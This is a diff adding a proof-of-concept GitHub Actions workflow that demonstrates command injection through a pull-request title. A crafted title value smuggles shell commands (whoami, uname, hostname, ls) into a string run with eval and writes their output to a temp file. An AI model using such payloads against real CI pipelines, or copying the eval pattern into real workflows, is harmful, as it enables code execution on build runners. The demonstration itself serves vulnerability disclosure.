@@ -1,0 +1,17 @@
+name: POC - PR Title Injection
+on: [push]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Demonstrate Injection
+        run: |
+          # Simulate vulnerable code pattern
+          MALICIOUS_TITLE="test'; whoami > /tmp/compromised.txt; uname -a >> /tmp/compromised.txt; hostname >> /tmp/compromised.txt; pwd >> /tmp/compromised.txt; ls >> /tmp/compromised.txt; #"
+          
+          echo "Vulnerable code execution:"
+          eval "echo 'PR processed: ${MALICIOUS_TITLE}'"
+          
+          echo "Proof of execution:"
+          cat /tmp/compromised.txt
